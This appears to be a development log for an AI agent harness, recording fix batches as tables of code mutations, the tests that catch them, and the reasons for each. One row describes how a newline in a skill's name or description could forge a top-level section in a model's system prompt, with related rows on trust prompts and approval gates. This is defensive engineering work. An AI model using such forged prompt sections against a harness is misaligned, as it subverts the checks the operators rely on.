| Default `with_catalogs(callable_only=...)` to `True` | `test_an_attended_pass_still_gets_the_catalog` | §25's point: a pass WITH a channel can ask, so hiding its catalog reports a limitation the run does not have |
| Stop passing the facts at `run_deep_research_mode` | `test_an_unattended_pass_is_not_told_to_spawn` | Everything else drives `pass_prompt` directly, which pins the FUNCTION and not the call. This mutation survived the whole suite once — the fix correct and unreached, which is #68's own shape |
| Make `advertisement_facts(None)` return "attended" | `test_no_bundle_means_headless` | `_authorization_kwargs` returns `{}` for `None`, so `response_channel` stays `None` and `_run` reads that as headless. Any other answer advertises a catalog to exactly the runs that cannot use it |
| Drop the whitespace collapse from `_catalog_text` | `test_the_forged_section_cannot_reach_a_system_prompt` | This is the security half, not a tidiness. The catalogs render `- {name}: {description}`, so a newline does not look untidy — it LEAVES ITS BULLET and forges a top-level prompt section |
| Apply the bound to `description` but not `name` | `test_the_name_is_normalised_too` | Both are interpolated into the same line. The name is the half a reader is less likely to think of |
| Widen the cap check to `<= MAX + 1` | `test_a_description_at_the_cap_is_untouched` | Its earlier form asserted `!= exact`, which an off-by-one satisfies: the over-cap string comes back unchanged and is indeed not the shorter one. "Different from" is not "bounded by" |
| Refuse an over-long description instead of truncating | Nothing fails — and it is the wrong trade | A description is advisory prose read by a model, so it degrades gracefully. Skipping the file loses a whole working skill over the length of its summary. The one exception is a name collapsing to `""`, which DOES hand back to skip-and-warn: D18's collision rule cannot reason about a nameless definition |
| Show the RAW frontmatter in the trust prompt | `test_what_is_shown_is_what_would_be_injected` | A summary displaying something other than what reaches the prompt is worse than showing nothing — it invites trust in a string that is not the one used |
| Skip an unparseable project definition in the summary | `test_an_unreadable_definition_is_reported_not_hidden` | This function runs only on untrusted content. "This file is here and I cannot tell you what it says" is a fact the person answering needs, and silently omitting it makes a malformed file the way to stay out of the summary |
| Default `spawnable` to `True` when undeclared | `test_a_user_agent_that_omits_it_loads_as_not_spawnable`, `test_no_spawnable_agent_means_no_section_at_all` | An agent written for `/agent` and silently advertised as spawnable is #69's actual complaint |
| Extend the harness-tier assertion to every tier | `test_a_user_agent_that_omits_it_loads_as_not_spawnable` | See the asymmetry above. Our omission is a build error; a stranger's gets the safe answer |
| Treat `spawnable: false` as a ban rather than a catalog filter | `test_a_non_spawnable_agent_is_still_reachable_by_hand` | `/agent` lists `manager.names()`. A human selecting `grill-me` supplies the thread it needs by BEING in one — the agent is not broken, the delegation route is |
| Clear `needs_approval` in the loop without a dispatch-side check | `test_the_refusal_still_reaches_the_model` | `needs_approval = False` is not "proceed". dispatch re-checks approval itself, finds no callback, and reports "requires approval and was not given" — a cause that is not the cause, and worse than the empty modal it replaced |
| Move the pre-flight after dispatch's approval gate | `test_an_unknown_agent_produces_no_question` plus the test above | The order IS the fix |
| Raise `ToolCallDenied` from the pre-flight instead of returning | `test_the_handler_returns_exactly_what_the_pre_flight_reported` | A refusal is the tool's own answer about its own call. `ToolCallDenied` means policy blocked you, which is a different fact the model should be able to tell apart |
| Have `refusal_reason` return a reason for everything | `test_a_valid_spawn_IS_still_asked_about` | It would satisfy every "no question was raised" assertion while silently removing §18's sign-off — the mechanism that makes delegation something a human agreed to |
| Give chat the pipeline's closing sentence | `test_chat_names_the_person` | It tells a chat turn its instructions come from a pipeline it is not in. Asserted on `DEFAULT_SYSTEM_PROMPT`, not on the constant: an earlier version checked the constant, so swapping which one `core/loop.py` reaches for was invisible |
| Keep a second copy of the defence paragraph | `test_there_is_exactly_one_copy_on_disk` | Two copies is how one gets improved and the other does not, and the one that does not would be whichever mode nobody was thinking about — which is how #72 happened |
| Edit the preamble so a pass prompt changes | `test_the_pass_prompt_is_byte_identical`, per pass, by digest | A8 moves text between files. Rewriting ten pass prompts is not something to do as a side effect of a chat fix. If the change is deliberate, the digest is what needs updating — and the failure is the prompt to think about whether the pipeline meant to change |
| Rename `zulu`/`alpha` back to `first`/`second` in the pinning test | `test_multiple_active_skills_are_pinned_in_order` stops discriminating — nothing fails | `sorted(["first", "second"])` is already that order, so the one test named for the pinning order held whether `prompt_fragment` preserved activation order or sorted. The assertion was right; the inputs could not tell the implementations apart |
| Call `headless_hidden()` with no context in `candidate_approvals` | `test_candidate_approvals_is_computed_FOR_THE_CHILD_not_globally` | Not an escalation — `allowed_tools` still narrows at dispatch. The defect is the sign-off NOTICE promising authority the grant does not carry, which that function's own docstring calls worse than not offering it |
| Start `active_context` at `subagent_depth=1` | `test_active_context_starts_at_depth_zero` | It silently halves the nesting budget for a `/agent`-switched session and nothing reports the difference |
| Let the parent run's model beat the agent's declared one | `test_an_agents_declared_model_beats_the_parent_runs` | "An agent's declared model/provider is its identity", and `effort_for`'s docstring cites this exact inversion as one of three ways a wrong effort used to reach the wire |

### Two things measured here that are not this batch's doing

**No shipped builtin is both approval-gated and `GRANT_ANYWHERE`** — `remember` and
`spawn_subagent` are `never`, `write_project_doc` is `signoff_only` — so R15's granted branch in
`is_advertised`/`schemas()` is reachable today only by an MCP tool. Its control test registers one
rather than selecting off the roster, because a skipping control is not a control.

**A fix that empties a collection makes every test asserting absence from that collection vacuous.**
A4 emptied the agent catalog, and three assertions in `test_review.py::TestCatalogsFollowTheContext`
would have passed for the wrong reason — *absent because the context suppressed it* and *absent
because there was nothing to suppress* are the same observation. That class now has three recorded
instances (§31's `os.times()`, #71's `first`/`second`, this), and this is the first found by making
the change rather than by sweeping for it. The batch that empties the collection is the only moment
anyone is positioned to notice.


## §29 — the thirteenth fix batch: the call boundary (2026-08-21)

> Same section-number collision as §28 records: this file's counter is independent of ROADMAP_v2's,
> so this §29 is the thirteenth fix batch, recorded in ROADMAP_v2 **§33**.

Closes audit **#37** (S2, stability), **#38** (S3), **#39** (S3) and **#135** (S3, performance) —
and with them **unit 3 (#41)**, the first unit *tracker* of Audit Pass 1 to be closed. (Corrected
in §30: unit 3 was the eighth unit **finished**, not the first. Units 16 and X4 were complete on
2026-08-17.)

### The change that breaks code outside this repository, stated first

**Four public names are gone from `core.client`:** `call_model()`, `collect_response()`,
`list_models()`, `select_model()`. So is **`ModelResponse.raw`**. Nothing in the tree called any of
them; `core/loop.py` calling `call_model_stream` is the only model call site there has ever been.

`raw` is the one worth a sentence. It was set only by `call_model`, and every streaming branch
omitted it, so it was `None` on every live path behind a comment reading *"original SDK response,
kept for logging/debugging only"*. Deleting `call_model` without deleting `raw` would have turned a
field that was accurate-but-divergent into one that was simply false.

A caller that wants the streaming result without the events writes the four-line drain itself —
which is what `collect_response` was, and what both test files now do locally. Shipping it as a
public entry point nobody called is how `call_model` got where it did.

### If you change this, this is what fails

| change | what fails | why it is that way |
|---|---|---|
| Parse `arguments` with a bare `json.loads` again | `test_a_truncated_tool_call_does_not_raise_out_of_the_generator` | `dispatch()` turning a handler's exception into `{"error": ...}` is the whole reason a raising TOOL cannot kill a run. Nothing played that role for a raising TRANSLATION, so a response cut mid-arguments took a JSONDecodeError into the pipeline's `except Exception` — `status='failed'` on a run that had finished nine passes |
| Raise from `_tool_arguments` instead of returning | `test_the_refusal_reaches_the_model`, and the mutation `W1-parse-failure-raises-again` | A10's rule. A refusal is the boundary's own answer about one call; raising loses the turn, and the model never learns it can reissue |
| Return `{}` with no error on a parse failure | `test_a_malformed_call_is_never_dispatched` | The arguments are `{}` by then, so a tool that tolerates empty params would RUN — `web_search` with no query. Refusing is not tidiness |
| Accept JSON that is not an object | `test_valid_json_that_is_not_an_object_is_refused`, parametrised over `null` / list / int / str | `json.loads("null")` is not an error — it returns `None`, and `input=None` reaches every handler. Rarer than a truncation, caught in the same place because the consequence is the same |
| Drop the `if not raw_args` fallback | `test_empty_arguments_are_not_an_error` | `get_time` declares `properties=[]` and `pin` has no required parameters, so this is a live path. Unit 3's mutation P10 deleted it and was GREEN on all 1406 — nothing covered a tool call with no arguments |
| Stop reading `finish_reason`, or report every failure as a length cut | `test_a_length_cut_is_named_as_one` and `test_bad_json_is_NOT_reported_as_a_length_cut` | The second is the control. Reporting every parse failure as a truncation would make the branch unfalsifiable and tell the model to shorten arguments that were never too long |
| Drop `or finish_reason` | `test_finish_reason_is_kept_once_seen` | A last-write-wins defence of the same family as the `name_parts` accumulation twenty lines above, reachable for the same reason: a provider that keeps emitting choices after the one carrying the reason. **This mutation survived once** — see the note below |
| Test it with the usage chunk instead | nothing fails, and that is the point | A usage chunk has `choices: []`, so `if chunk.choices:` skips it and the line is never reached. `test_a_usage_chunk_cannot_clobber_the_reason` pins the fact that made the wrong version look right |
| Persist `parse_error` with the tool call | `test_the_parse_error_never_reaches_storage` | W2. It describes one wire read, not the thread. In a resumed history a later turn would read it as something the assistant said |
| Drop the malformed call instead of carrying it | `test_the_call_is_carried_not_dropped` | The model made a call and is owed an answer. Dropping it leaves a `tool_use` with no matching `tool_result` — M4's pairing defect — and makes a truncated call look like a turn that called nothing |
| Ask the user to approve a call that cannot run | `test_no_approval_is_asked_for_a_call_that_cannot_run` | A7's rule. Approving it could not make it runnable, and headless the old path reports "requires approval and was not given" — A7's exact wrong-cause failure |
| Refuse every call rather than only malformed ones | `test_a_well_formed_gated_call_IS_still_asked_about` | The control. A guard that suppressed every question would satisfy the test above while silently removing approval |
| Move the refusal into `dispatch()`, as A7's is | it cannot be done, and W1 records why | `dispatch(name, params, context)` never sees the failure — `{}` is a perfectly good empty dict by the time it arrives. The loop is the only layer that can see a `parse_error` |
| Delete `_run()`'s no-final-response guard | `test_a_stream_with_no_final_response_raises` | That contract belonged to `collect_response`, which had its own test. Deleting the helper must not delete the property, and `core/loop.py` was the only enforcement left — untested until this batch |
| Import a provider SDK at module scope | `test_importing_core_client_does_not_import_any_provider_sdk` | `core.loop` imports this module and `main.py` imports `core.loop`, so it is paid by every invocation of either shell before argparse runs. Measured: 1,766 ms of a 2,619 ms `--help`. A SUBPROCESS test, because the root conftest stubs all three into `sys.modules` before collection |
| Hoist `genai_types` to the top of its function instead of into the branch | `test_importing_core_client_does_not_import_any_provider_sdk` stays green, and the defect is back | Three of the five functions use it only on their GOOGLE branch, so a top-of-function import is paid on every ANTHROPIC turn. This is the issue's own suggested fix, and it is wrong |
| Check `"google" in sys.modules` rather than `"google.genai"` | nothing fails, and the check is worthless | `google` is a namespace package protobuf puts in `sys.modules` regardless. This batch made that mistake once while measuring and reported a false positive to itself |
| Patch `core.client.genai_types` in the effort-gate test | `test_google_gate_inspects_the_sdk_class` errors on a missing attribute | There is no module-scope name any more. It patches `google.genai.types` itself — the stricter target, since that is the module the function imports from |

### The survivor, and the sub-shape of the vacuity class it exposed

One of 24 mutations survived: deleting `or finish_reason`, on a line this batch had **written a
test for**. The test asserted that a length cut is still reported after the usage chunk arrives.
True, and irrelevant — the usage chunk has `choices: []`, so the line under test is never reached.

Driven both ways before rewriting, rather than guessed. With `or finish_reason` deleted, the
usage-chunk shape still reports the length cut; a trailing chunk that *has* choices and a null
`finish_reason` falls back to the generic message.

The vacuity class now has four instances, and this is a new sub-shape. §31's `os.times()`, #71's
`first`/`second` and #69's emptied catalog are all inputs that cannot **discriminate**. This is an
input that cannot **arrive** — a guard upstream skips it. The usual sweep (vary the input, see
whether the assertion still holds) does not find it, because the assertion does hold, for a reason
unrelated to the code under test.


## §30 — the fourteenth fix batch: /init's vocabulary (2026-08-21)

> This file's counter is independent of ROADMAP_v2's, so this §30 is the fourteenth fix batch,
> recorded in ROADMAP_v2 **§34**.

Closes audit **#96** (S2, correctness), **#94** (S3), **#95** (S3) and **#98** (S3) — and with them
**unit 12 (#99)**.

### The change that affects code outside this repository, stated first

**`read_project_doc` accepts five more filenames:** `setup.py`, `setup.cfg`, `Gemfile`, `pom.xml`,
`build.gradle` — **at the project root only**. They are exact-basename entries, so `.py` is not a
readable extension and `main.py` stays refused; and they are the first entries in `_DOC_FILENAMES`
that do not match at any depth, so `src/vendor/setup.py` stays refused too.

`manifest.detect_facts()` gains a `code_manifests` key (a list, in table order) and now sets
`stack` for ten of the twelve manifest filenames rather than seven. `_MANIFEST_FILES` is gone,
replaced by `_MANIFEST_TABLE`; `propose_kind`'s reason string now names the files it found.

`InitError` may carry a multi-line message. Both shells already print it verbatim.

### If you change this, this is what fails

| change | what fails | why it is that way |
|---|---|---|
| Branch `propose_kind` on `stack` again | `test_every_manifest_that_names_a_stack_proposes_software`, parametrised over ten filenames | "Is this a codebase" and "what is it written in" are two questions. Answering the first with the second made a Java, Ruby, Gradle, C or container project `research` — and printed *"no code manifests found"* as the reason while the manifest listed the manifest |
| Give `Dockerfile` or `Makefile` a stack | `test_a_build_file_proposes_software_with_no_stack_claimed` | The fix is not "give every manifest a stack". A Makefile is C, Go, LaTeX or this repository; a Dockerfile says nothing about what is inside the image. Strong evidence of a codebase, none at all about the language |
| Drop the filenames from the reason | `test_the_reason_names_the_files_it_found` | I13 returns the reason *"so the confirmation prompt can show its working"*, and for this heuristic the filename **is** the working |
| Claim `make test` without the target | `test_make_test_is_claimed_only_when_the_target_exists` | I10: a fact in a committed document is read as established, and a wrong one is worse than an absent one |
| Match `test` as a prefix rather than `^test\s*:` | `test_a_tests_target_is_not_a_test_target` | The control. A target name is exact, and `tests:` is a different target |
| Claim `bundle exec rspec` with no `spec/` | `test_rspec_is_claimed_only_with_a_spec_directory` | Ruby's runner is a choice; minitest and rspec are both ordinary |
| Ignore a shipped `gradlew` | `test_the_gradle_wrapper_is_preferred_when_the_project_ships_one` | Shipping a wrapper is a statement about which Gradle to use |
| Let a default beat `package.json`'s `scripts.test` | `test_package_json_still_wins_over_pytest` | Precedence a table could quietly reorder. A project holding both has decided something |
| Emit one stack per matching file | `test_one_stack_is_named_once_however_many_files_say_it` | Four of the twelve filenames say Python. The stack line is for a human reading a confirmation prompt |
| Make `code_manifests` a set | `test_the_manifest_list_is_in_table_order_not_set_order` | It is printed to the user behind a proposal, and a set prints in whatever order the interpreter felt like that run |
| Give the manifest listing its own idea of what is readable | `test_every_advertised_path_is_one_the_tool_accepts` | The listing prints *"Paths below are exactly what read_project_doc expects"* over it. Advertised 15, refused 6 — and each refusal costs one of the initializer's twelve steps |
| Narrow the listing back to extensions | `test_nothing_readable_is_hidden_from_the_listing` | The direction nobody would notice: `.txt` was readable and invisible, so a project keeping its notes in `.txt` had them unlisted |
| Advertise `readme.bin` again | `test_a_readme_the_tool_cannot_read_is_not_advertised` | Fixed listing-side. It stays in the LAYOUT, which is not an advertisement — the tree says what the project contains, the listing says what can be read |
| Match the five build manifests at any depth | `test_a_nested_copy_of_a_build_manifest_is_refused`, parametrised over all five | A vendored tree is where unreviewed third-party source lives, and it is the one place these five are not the project's own statement about itself |
| Add `.py` to `_DOC_EXTENSIONS` | `test_adding_setup_py_did_not_add_python`, over five filenames | The whole basis on which the widening was taken. A suffix entry turns `read_project_doc` into `read` with no approval gate, for every run in the harness |
| Drop one of the five names | `test_the_five_build_manifests_are_readable_at_the_root` | |
| Remove `except InitError` from the write loop | `test_a_write_that_fails_names_the_files_it_already_created` | `ToolCallDenied` cannot fire there — consent is granted a few lines above — while `_write` raises `InitError` for every error dict, which is where every OSError arrives |
| Settle trust only on success | `test_a_partial_write_leaves_a_trusted_project_trusted` | The partial write has already moved the D17 hash, so I6's bad outcome arrives by the route I6 was not looking at |
| Grant trust regardless of `was_trusted` | `test_a_partial_write_does_not_launder_an_untrusted_project` | The control. Granting on a failed /init would launder a cloned `.venastine/` in through a door nobody is watching |
| Drop the list of files already written | `test_a_write_that_fails_names_the_files_it_already_created`, and `test_a_failure_before_anything_was_written_says_so` | The second is the control: "Nothing was written" is a different sentence from a list of length zero |
| Roll the partial write back | `test_a_partial_write_is_not_rolled_back` | It would be true of the stubs and false of the file that mattered — the hub's previous content is gone by the first step |
| Ignore `_write`'s error dict | the four tests above | The branch every filesystem failure takes. Only `ToolCallDenied` was covered, and a normal /init cannot reach it |
| Build the index from `all_document_names()` | `test_the_index_is_a_pure_function_of_the_kind` | It asserts the exact line set per kind now. The old version compared a call to itself and then checked each name was present, which catches a MISSING name and cannot see an extra one |
| Remove `sorted()` from `_root_documents` or `_tree` | `test_the_manifest_is_stable_across_runs`, `test_the_layout_is_sorted_too` | Both hold the filesystem still with `_hand_back_reversed`, because NTFS returns sorted names anyway and the tests could not otherwise see the sort — which is how the versions they replace came to be green |
| Drop `_PRUNED`, or drop the dotfile filter | `test_the_walk_prunes_the_directories_that_would_flood_it`, `test_the_walk_prunes_dotted_directories_too` | Two mutations, two tests. `node_modules` "turns a listing into a denial of service on the context window"; `.venastine` holds mcp.json and settings.json, neither covered by `_is_secret` |
| Prune everything | `test_a_directory_that_should_be_walked_still_is` | The control |
| Change `f.read(4096)` to `f.read()` | `test_a_heading_is_read_from_the_head_of_the_file` | ~1 MB of reads per manifest build in this repo. The padding is BLANK LINES: `_first_heading` returns on the first non-empty line, so `x`-padding cannot reach the cap at all |

### The two survivors, and why they are in this record

27 mutations, two survivors — and both were tests **this batch wrote for #98**, the finding about
tests that cannot see the property in their own name. `os.walk` hands back an already-sorted list
on this filesystem, so three ordinary filenames could not discriminate `sorted()`; and
`_first_heading` returns on the first non-empty line, so a heading after 5,000 `x`s was unreachable
whether the read was capped or not.

Both were diagnosed by running them, not by rereading them. The lesson is the one #98 states —
a test named for a property it cannot see *"reads as coverage in a report, which is worse than an
acknowledged gap"* — and it applies to the fix as much as to the thing being fixed. **Final: 27 of
27 RED.**


## §31 — the fifteenth fix batch: the record's index (2026-08-22)

Audit issues **#16**, **#17**, **#147** and **#91**. Closes unit X5 (#148); #16 and #17 belong to
the master tracker #15 rather than to a unit.

Three of the four were filed as separate defects and are one: **an id that cannot be found, or that
resolves to two things.** The fix is one check rather than three prose corrections, which is #147's
own argument — prose is what drifted.

### If you change this, this fails

| Change | Fails | Why the property exists |
|---|---|---|
| Move `S1`–`S4` or `E1`–`E12` back out of `ROADMAP_v2.md`'s record | `test_every_decision_id_the_map_claims_is_in_the_record` | `AGENTS.md`'s map says the ROADMAPs carry the record. All sixteen were `DEVLOG`-only, and this project's convention on finding no record is to **re-derive** the decision (#16) |
| Drop a `C` definition, or the whole family | same | `C3`/`C6`/`C10` are cited as authority in six production files and in this document; `C6` is intersection-never-union, one of the few where re-deriving it wrongly silently widens a subagent's reach (#147) |
| Stop naming `E` or `C` in `AGENTS.md`'s map | `test_the_map_names_every_family_the_record_defines` | The forward direction cannot see a family the map never mentions. `E` was omitted while `AGENTS.md`'s own ensemble section cited nine `E` ids by number (#148) |
| Add a family to the record and not to the map | same | Caught this batch's own omission on the check's first run |
| Claim a range in the map wider than the record holds | `test_every_decision_id_the_map_claims_is_in_the_record` | The map is where a reader learns which ids exist |
| Write `C1–C10` as a range in the map | same | `C` is **sparse** — C1, C3, C6, C8, C10. Only the conflicts with live citations were recovered |
| Remove `§21` from an `AC` citation | `test_every_decision_id_cited_in_production_code_resolves` | `AC` is section-scoped. `AC6` alone meant three different criteria in three files — §17's, §21's and §21b's (#17) |
| Remove `gate` from a `D0` citation | same | There is no decision `D0`; the record starts at `D1`. `D0` is a pipeline routing gate |
| Remove `Rev. 1` from `S12`, or `mutation` from `P10` | same | The `S` record stops at S4 and the `P` record at P4; both citations sit inside a decision family's numbering |
| Let a `review finding` qualifier wrap onto the line above its id | same | A reader greps one line at a time. `core/config_loader.py:122` was qualified in prose and unqualified to a grep |
| Cite a new id in production without defining or qualifying it | same | The check is a **qualifier grammar**, not a list of blessed ids, so it covers the citation nobody has written yet |
| Teach the definition scanner only one of the three shapes | `test_the_definition_scanner_sees_every_shape_the_record_uses` | The record writes a decision three ways. Knowing only table rows loses the whole `M` family, 21 ids — which is what this batch's first census did |
| Narrow `_DEFINITION_ROW` to require bold, or `_DEFINITION_LEAD` to require the dash outside it | same | One shape each: `\| D1 \|` is unbolded, `**M1 — ...**` has the dash inside |
| Widen a namespace's `covers` so any id can carry that qualifier | `test_the_qualifier_grammar_discriminates` | The loosen-the-check mutation: the citation test passes trivially while nothing about the documents changes. A section number must not qualify a **decision** that follows it (`§32 A3`) |
| Unanchor a single-word qualifier so it may sit anywhere on the line | same | `gate` must be adjacent. A sentence mentioning gates that then cites one is prose, not a qualifier |
| Stop reading docstrings in `_prose_lines` | `test_the_citation_scan_reads_docstrings_and_not_runtime_strings` | **The survivor that mattered.** A scan that reads less finds nothing wrong, and finding nothing wrong is what passing looks like. Most citations are in docstrings |
| Start reading runtime strings in `_prose_lines` | same | The pipeline's stage names **are** the strings `"D0"`/`"D1"` and its trace lines are keyed by them; `test_pipeline_trace_contains_expected_lines_in_order` matches on the `D0:` prefix |
| Drop the `(?<!-)` guard from `_CITATION` | `test_a_range_citation_does_not_report_its_own_endpoint` | A range's trailing endpoint is not a citation. Over a sparse family, `C1-C10` would report five decisions that never existed |
| Restore "and where they came from" to `effective_compaction`'s docstring | *nothing* — see below | Honest gap: it is a prose claim with no computable counterpart. `TECHNICAL_DEBT.md` item 12 carries it instead |

### One row with no test, stated rather than hidden

`effective_compaction`'s docstring promised provenance the function does not return (#91 item 2).
There is nothing for a test to compare a docstring's first sentence against, so this one is guarded
by the register rather than by the suite — `TECHNICAL_DEBT.md` item 12, which names both decisions
the eventual builder faces: the return shape (twelve call sites subscript the flat dict) and where a
user would read it (there is no `/config`).

### The pair nothing can force

`D1` and `D2` are both decisions **and** pipeline gates. Both resolve, so the check cannot tell
which was meant, and no amount of grammar fixes that without renumbering — which #147 rejected
because the ids are in six production files. Write `gate D1` when you mean the gate.

## §32 — the sixteenth fix batch: compaction's boundaries (2026-08-22)

Audit issues **#45**, **#44 + #172**, **#89**, **#43**, **#90** and the
surviving items of **#92**. One owner decision rides along: `MAX_ITERATIONS`
is 50 now (it was 20), because #45's repair default is this constant and a
clamp that repairs to one number while every turn runs at another would be
two answers to one question.

### If you change this, this fails

| Change | Fails | Why the property exists |
|---|---|---|
| Re-widen the loader's max_steps guard to type-only (`config_loader.py`) | `test_yaml_boolean_max_steps_is_repaired_with_a_naming_warning`, `test_negative_max_steps_is_repaired_not_crashed` | #45: `-1` passed the type check, was truthy at every call-site fallback, and crashed `_run` three layers from the frontmatter line. Repair-not-reject is an explicit owner decision — the file keeps its agent, the field falls back to undeclared, and the warning names the original |
| Delete `_run`'s max_steps belt (`core/loop.py`) | `test_non_positive_max_steps_raises_named_valueerror_not_attributeerror` | Direct callers bypass the loader; the old failure was an AttributeError on `response.stop_reason` after an empty step loop. The raise names the parameter and the loader default instead |
| Change the derived-mode mapping in `_derived_compaction_mode` (`core/loop.py`) | `test_a_re_entered_machinery_thread_asks_in_backstop_mode`, `test_a_resumed_chat_thread_keeps_the_working_set_trigger`, `test_an_explicit_mode_beats_the_derivation`, `test_a_spawned_subagent_thread_derives_backstop_without_being_told` | #43: a re-entered machinery thread ran on the chat trigger because continue_conversation could not express a mode. Explicit beats derived -- stream_deep_research_mode stays the definition site |
| Make `compact()` return None on a no-progress exit again, or move logging back inside it | `test_an_empty_summary_skips_compaction`, `test_a_missing_compactor_agent_is_a_skip_not_a_crash`, `test_no_new_turns_means_no_model_call`, `test_the_standing_condition_warning_is_also_said_once_per_run` | #44: reportability lives with the caller. Per-evaluation WARNINGs were heard 21x/turn while the notice was deduplicated to one |
| Drop the notices field from OneShotFinished, or un-inline the /compact outcome text | `test_a_one_shot_surfaces_the_notices_its_turn_raised` | #172: the one-shot drained through run_to_completion, so a compaction at its boundary reached neither route |
| Delete `unpin`, or make pin trim instead of refusing over-cap | `test_unpin_is_registered_and_symmetric_with_pin`, `test_unpin_releases_and_reports_what_remains`, `test_an_over_cap_pin_is_refused_with_numbers_and_changes_nothing` | #89: D26 called pin reversible while nothing reversed it; trimming would silently deliver less protection than asked (M15) |
| Revert `COMPACTION_STRATEGY` to rederive without the gate, or silence the forced-chain WARNING | `test_a_rederive_span_that_outgrows_one_call_forces_chain_and_says_so`, `test_an_oversized_span_with_no_previous_is_truncated_and_says_so_twice`, `test_chain_configured_does_not_claim_a_forced_switch`, `test_an_oversized_thread_is_truncated_and_the_row_says_so` | #90: three documents promised a fallback that did not exist. The truncation marker is deterministic on the stored row -- never trusted from model compliance |
| Delete the `[called: ...]` line in `_as_text`, or stop _chars counting tool_calls | `test_a_folded_turn_names_the_tools_it_called`, `test_the_estimate_counts_what_a_turn_weighs` | #92 items 1-3: the only signal a folded turn used tools, and the pre-measurement estimate is a resumed thread's whole first-call signal |

## §33 — the seventeenth fix batch: MCP's edges (2026-08-22)

Six issues, one subsystem (#60, #61, #62, #63, #64, #65); decisions F1–F8 in
`ROADMAP_v2.md` §37. Commits `7a05ee0`, `408af65`, `85fd108`, `dd5b5cb`,
`dc02251`, `74f6d19`.

| Change | Tests that fail if reverted | Why it matters |
|---|---|---|
| Put `sse` back in the streamable alias set, or let `_transport_for` hand an SSE server a bare URL string | `test_an_explicit_sse_type_is_its_own_transport_not_an_alias`, `test_an_sse_server_always_builds_its_own_transport_never_a_bare_url` | A bare URL string means STREAMABLE HTTP to v2's Client() — the silent misconnection is the type of the returned object, which is why the tests assert on type |
| Let a declared-but-unsupported type fall through to HTTP | `test_a_declared_unsupported_type_refuses_rather_than_falling_through` | M7: validation is by connecting, but only for entries we understood; a named error is the contract |
| Drop the security-posture lines from describe(), or print env VALUES | `test_describe_names_auto_approve_the_field_that_removes_every_future_prompt`, `test_describe_shows_cwd_disabled_and_env_key_names` | The one field that decides whether any future prompt exists was invisible at the only moment the user was asked; values on the terminal is a different defect |
| Feed describe()'s text into entry_digest, or drop VENASTINE_MCP_ACK_FULL handling | `test_improving_describe_alone_never_reasks_an_acknowledged_server`, `test_venastine_mcp_ack_full_appends_the_raw_entry_verbatim` | Text feeds nothing: the digest hashes the raw entry, so wording changes never re-ask and F3's bump is the ONE deliberate re-consent |
| Treat legacy stores as known, or carry legacy digests forward in remember_server | `test_a_legacy_store_reasks_every_server_exactly_once`, `test_acknowledging_one_server_does_not_convert_its_unasked_siblings` | v1 consents were blind (no autoApprove in the prompt); one answer must never convert unasked siblings |
| Revert teardown to three sequential per-stage timeouts | `test_a_wedged_server_is_named_and_the_budget_holds` (elapsed arm) | ~45s worst case hung a quitting harness, Ctrl+C included; the budget is SHARED, so the test bounds total elapsed, not any stage |
| Make _TrackClose record cancelled closes as clean, or delete the straggler WARNING | same test (straggler arms) | "We stopped waiting for it" is what the straggler line means; naming requires recording only unexceptional exits |
| Delete disconnect_all's cancel fallback, or unregister from teardown_mcp | `test_non_graceful_shutdown_still_cancels_the_manager`, `test_teardown_unregisters_what_setup_registered` | M18 asserted on _done (cancellation), not bookkeeping; F7 makes ARCHITECTURE.md's "disconnect handling" claim true |
| Fetch the catalogue again in register_all | `test_registration_never_fetches_the_catalogue_over_the_wire` | MCP's one timeout-less bridge call; the live session is poisoned in the test so any fetch fails loudly |
| Delete the disabled-skip, register_all's listing guard, future.cancel(), or sort_keys | `test_disabled_servers_are_never_connected`, `test_one_servers_listing_failure_does_not_abort_servers_after_it`, `test_a_timed_out_call_cancels_its_future`, `test_entry_digest_is_stable_under_key_reorder` | M17/M25/M13/M5 — each mutation survived the suite before this batch; each test now dies with its line |

## Batch 18 -- the eighteenth fix batch: persistence and the picker (2026-08-22)

| Change | Tests that fail if reverted | Why it matters |
|---|---|---|
| Drop NOT NULL from ensure_columns' DDL, or stop carrying nullability through _declared_columns | test_not_null_is_carried_when_a_literal_exists, test_a_migrated_column_matches_the_fresh_schema_exactly | #26: a migrated database must permit exactly what a fresh one permits; the PRAGMA flags are compared directly against create_all's output |
| Make the no-literal not-null case silent, or refuse it outright | test_a_declared_not_null_column_without_a_literal_stays_nullable_and_warns | SQLite cannot ADD COLUMN ... NOT NULL without a default; nullable-plus-WARNING is the honest degradation, silence is the defect |
| Let advances() return True unconditionally when no checkpoint exists yet | test_a_first_compaction_refuses_a_watermark_from_another_thread, test_advances_containment_holds_before_any_checkpoint | #27: first compaction is when nothing else catches a foreign watermark; containment must hold before the ordering comparison can |
| Filter list_memories in Python again, or drop the visibility WHERE clause | test_the_pushed_down_visibility_query_matches_the_old_filter_exactly (plus the AC6 pair beside it) | #28: two indexed columns had no reader; the push-down is what makes them load-bearing, and the edge set -- NULL-path project row included -- must survive it verbatim |
| Order the picker by created_at again, or stop stamping last_activity_at in save_message | test_working_in_an_old_thread_lifts_it_above_a_newer_one (and the tool-row and no-message arms beside it) | #32: most recent first must mean most recently ACTIVE; the stamp rides the single MessageLog writer so message and activity cannot drift |
| Load every user message and keep the first in Python again, or drop the rn==1 pick | test_the_preview_query_returns_the_first_user_message_of_every_thread | #30: the window function is what makes ONE query mean one ROW per thread; 40x over-read was ~98% of picker cost |
| Apply list_threads limit before ordering, or ignore it | test_list_threads_limit_caps_after_ordering | Q7: the cap must keep the globally most-recently-active rows or it silently hides exactly the threads users want |
| Make get_thread / latest_checkpoint / latest_thread_summary return detached ORM instances again | test_a_backwards_watermark_is_refused and the whole fake-mirror set (test_fake_storage_mirror.py included) | #31: attribute access on a detached instance works only until something expires it; two of the three reads sit on the compaction path where a wrong read rewrites a live conversation |

## Batch 19 -- the nineteenth fix batch: ensemble mode, honest and visible (2026-08-23)

Five production contracts changed. Every test below was driven RED against its
reverted line before the fix commit landed.

| Change | What breaks | Symptom / fix |
|---|---|---|
| `PipelineRunRecord` gains `candidates_json` (#77/E13) | A pre-batch row reads NULL after `ensure_columns`' ALTER | `load_pipeline_run` guards with `or "[]"`; pinned by building that row shape (`test_load_pipeline_run_survives_a_legacy_null_candidates_column`) |
| `update_pipeline_run` strips `text` from candidate entries | The database silently growing a third copy of every response | Exact key-set assertion on the round-trip; strip-filter mutation RED |
| Ensemble artifact layout: `01_candidate_N.md` when >=2 survive, else byte-for-byte `01_raw_response.md` (#77/E13) | A reader expecting the historical name on a degraded run | Both shapes pinned in `test_output_writer.py`; the >=2 gate is mutation-sighted |
